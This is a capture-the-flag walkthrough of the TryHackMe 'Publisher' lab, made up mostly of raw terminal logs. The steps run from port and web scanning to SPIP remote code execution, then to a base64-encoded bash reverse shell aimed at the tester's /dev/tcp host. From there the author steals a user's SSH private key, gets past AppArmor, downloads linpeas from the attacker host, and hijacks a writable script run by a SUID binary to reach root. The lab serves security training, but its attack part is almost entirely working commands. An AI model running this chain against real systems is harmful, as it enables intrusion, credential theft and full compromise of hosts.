<code>
https://tryhackme.com/r/room/publisher

┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ nmap -sV -Pn 10.10.188.239
Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-16 03:07 CDT
Nmap scan report for 10.10.188.239
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.31 seconds
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ nmap -A -Pn -p80 10.10.188.239
Starting Nmap 7.92 ( https://nmap.org ) at 2024-07-16 03:08 CDT
Nmap scan report for 10.10.188.239
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds



                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ nikto  -h http://publisher.thm                 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.188.239
+ Target Hostname:    publisher.thm
+ Target Port:        80
+ Start Time:         2024-07-16 04:18:58 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ RFC-1918 IP address found in the 'location' header. The IP is "172.17.0.2".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "172.17.0.2".
+ Server may leak inodes via ETags, header found with file /, inode: 21ee, size: 60cf5aa5ef7f4, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /images/: Directory indexing found.
^[[21~+ 7785 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2024-07-16 04:25:15 (GMT-5) (377 seconds)


┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://publisher.thm -x .txt,.php,html        
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
2024/07/16 03:17:49 Starting gobuster in directory enumeration mode
/images               (Status: 301) [Size: 315] [--> http://publisher.thm/images/]
/index.html           (Status: 200) [Size: 8686]                                  
/spip                 (Status: 301) [Size: 313] [--> http://publisher.thm/spip/]  
/server-status        (Status: 403) [Size: 278]                                   
                                                        


### SPIP 4.2.0 - vulnable

http://publisher.thm/spip/spip.php?page=backend
http://publisher.thm/spip/spip.php?rubrique1
http://publisher.thm/spip/spip.php?page=contact

http://publisher.thm/spip/spip.php?page=login&url=%2Fspip%2Fecrire%2F&lang=fr


### Initial access
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ python3 51536.py -u http://publisher.thm/spip -c whoami
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ echo -n "bash -i >& /dev/tcp/10.9.30.202/6666 0>&1" | base64 -w0 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE=                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ python3 51536.py -u http://publisher.thm/spip -c "whoami"       
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ python3 51536.py -u http://publisher.thm/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE= 
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ python3 51536.py -u http://publisher.thm/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjMwLjIwMi82NjY2IDA+JjE= | base64 -d | bash"

### Recoon get Think user key
www-data@41c976e507f8:/home/think/.ssh$ ls
ls
authorized_keys
id_rsa
id_rsa.pub
www-data@41c976e507f8:/home/think/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn

###  SSH access as Think
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ chmod 400 think   
                                                                                                                    
┌──(duke㉿kali)-[~/Documents/THM_Publisher]
└─$ ssh -i think think@publisher.thm

## Privilege Escalation - Shell Weirdness - can't write to /TMP, cant read /opt

think@publisher:/etc/apparmor.d$ aa-enabled 
Yes
think@publisher:/etc/apparmor.d$ cat usr.sbin.ash 
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}

## AppArmor Bypass

think@publisher:/etc/apparmor.d$ echo -e '#! /bin/bash\n/bin/bash -ip' > /dev/shm/pwn.sh
think@publisher:/etc/apparmor.d$ chmod 755 /dev/shm/pwn.sh
think@publisher:/etc/apparmor.d$ cat /dev/shm/pwn.sh 
#! /bin/bash
/bin/bash -ip
think@publisher:/etc/apparmor.d$ /dev/shm/pwn.sh 
### get normal shell
think@publisher:/etc/apparmor.d$ ls -l /opt/
total 12
drwx--x--x 4 root root 4096 Nov 14  2023 containerd
-rw-r--r-- 1 root root  861 Dec  7  2023 dockerfile
-rwxrwxrwx 1 root root 1715 Jan 10  2024 run_container.sh
think@publisher:/etc/apparmor.d$ cd ..
think@publisher:/etc$ cd ..
think@publisher:/$ cd tmp
think@publisher:/tmp$ wget http://10.9.30.202/linpeas.sh
--2024-08-12 09:53:15--  http://10.9.30.202/linpeas.sh
Connecting to 10.9.30.202:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847834 (828K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                   100%[==============================================>] 827.96K  3.06MB/s    in 0.3s    

2024-08-12 09:53:15 (3.06 MB/s) - ‘linpeas.sh’ saved [847834/847834]

### Privilage Escalation

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
-rwxr-sr-x 1 root mail 23K Apr  7  2021 /usr/libexec/camel-lock-helper-1.2                                          
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 root root 15K Dec 13  2023 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /usr/sbin/unix_chkpwd
###  -rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SGID binary)


think@publisher:/usr/sbin$ strings run_container 
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
GLIBC_2.4
u+UH
[]A\A]A^A_
/bin/bash
/opt/run_container.sh
:*3$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
think@publisher:/usr/sbin$ cd /opt
think@publisher:/opt$ ls -la
total 20
drwxr-xr-x  3 root root 4096 Jan 10  2024 .
drwxr-xr-x 18 root root 4096 Nov 14  2023 ..
drwx--x--x  4 root root 4096 Nov 14  2023 containerd
-rw-r--r--  1 root root  861 Dec  7  2023 dockerfile
-rwxrwxrwx  1 root root 1715 Jan 10  2024 run_container.sh
think@publisher:/opt$ cat run_container.sh 
#!/bin/bash
...
think@publisher:/opt$ echo -e '#! /bin/bash\n/bin/bash -ip' > /opt/run_container.sh
think@publisher:/opt$ cat run_container.sh 
#! /bin/bash
/bin/bash -ip
think@publisher:/opt$ /usr/sbin/run_container 
bash-5.0# whoami
root





</code>

